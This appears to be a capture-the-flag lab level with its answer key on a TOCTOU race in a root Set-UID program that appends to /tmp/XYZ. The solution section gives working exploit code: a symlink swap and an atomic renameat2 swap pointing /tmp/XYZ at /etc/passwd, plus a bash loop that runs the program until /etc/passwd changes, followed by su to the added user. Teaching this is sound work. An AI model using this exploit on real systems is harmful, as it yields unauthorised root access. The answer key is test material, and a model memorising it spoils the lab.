A compiled copy of `vulp` is already waiting for you at `/home/seed/lab/vulp`, built from the source at `/home/seed/lab/vulp.c` and already set up with root ownership and the Set-UID bit (in a real engagement you would not be handed a convenient root-owned Set-UID binary -- but reproducing exactly how one gets created is not itself the interesting part of this lab).

Read `vulp.c`. It appends a line of user input to `/tmp/XYZ`, but only after checking with `access()` that the real user running it is allowed to write that file:

```c
if(!access(fn, W_OK)){
    fp = fopen(fn, "a+");
    fwrite("\n", sizeof(char), 1, fp);
    fwrite(buffer, sizeof(char), strlen(buffer), fp);
    fclose(fp);
}
```

Run `ls -l /home/seed/lab/vulp` and look closely at the permission bits.

The flag for this level is the exact 10-character permission string `ls -l` shows.

levels.solution:
Naive (racy) version of the attacker's link-swap:
```c
unlink("/tmp/XYZ");
symlink("/etc/passwd", "/tmp/XYZ");
```
Atomic version, which avoids the attack program's own race condition:
```c
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main() {
    unsigned int flags = RENAME_EXCHANGE;
    unlink("/tmp/XYZ");  symlink("/dev/null", "/tmp/XYZ");
    unlink("/tmp/ABC");  symlink("/etc/passwd", "/tmp/ABC");
    syscall(SYS_renameat2, 0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
    return 0;
}
```
Driving loop (run the attack in the background, then loop `vulp`):
```bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
    ./vulp < passwd_input
    new=$($CHECK_FILE)
done
echo "STOP... passwd has been changed"
```
Then: `su <your-new-user>`, `id`, `cat /root/proof_task2.txt`.
